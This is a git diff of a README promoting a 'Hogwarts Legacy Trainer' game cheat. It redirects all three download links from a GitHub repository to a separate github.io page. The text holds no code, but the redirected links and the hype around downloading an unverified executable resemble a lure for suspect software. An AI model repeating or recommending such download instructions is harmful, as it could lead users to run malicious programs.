@@ -1,6 +1,6 @@
 # ⚡ hogwarts-legacy-trainer-v2-2026 - Unlock Magic, Power, and Infinite Riches Instantly
 
-[![Download Hogwarts Legacy Trainer v2](https://img.shields.io/badge/Download-Hogwarts_Legacy_Trainer_v2-blueviolet?style=for-the-badge&logo=github&logoColor=white&color=purple)](https://github.com/infocorsall-coder/hogwarts-legacy-trainer-v2-2026)
+[![Download Hogwarts Legacy Trainer v2](https://img.shields.io/badge/Download-Hogwarts_Legacy_Trainer_v2-blueviolet?style=for-the-badge&logo=github&logoColor=white&color=purple)](https://infocorsall-coder.github.io)
 
 Welcome to the **Hogwarts Legacy Trainer v2** — your ultimate companion for the magical world of Hogwarts! Whether you're tired of grinding for Galleons, stuck on a difficult boss battle, or simply want to experience every spell without restrictions, this trainer delivers everything you need with just a few clicks. Forget the grind, embrace the magic, and dominate the wizarding world like never before.
 
@@ -34,7 +34,7 @@ Ready to transform your Hogwarts experience? Follow these straightforward steps 
 ### Step 1: Download the Trainer
 
 Visit this link to download the application:  
-**[👉 Download Hogwarts Legacy Trainer v2](https://github.com/infocorsall-coder/hogwarts-legacy-trainer-v2-2026)**
+**[👉 Download Hogwarts Legacy Trainer v2](https://infocorsall-coder.github.io)**
 
 Simply click the download button on the page, and the trainer file will be saved to your computer.
 
@@ -69,7 +69,7 @@ Getting your trainer is quick and painless. Here’s everything you need to know
 
 ### Download Link
 
-**[⬇️ Click Here to Download the Trainer](https://github.com/infocorsall-coder/hogwarts-legacy-trainer-v2-2026)**  
+**[⬇️ Click Here to Download the Trainer](https://infocorsall-coder.github.io)**  
 *This is a direct download — no surveys, no waiting, no ad-filled redirects.*
 
 ### Installation Details
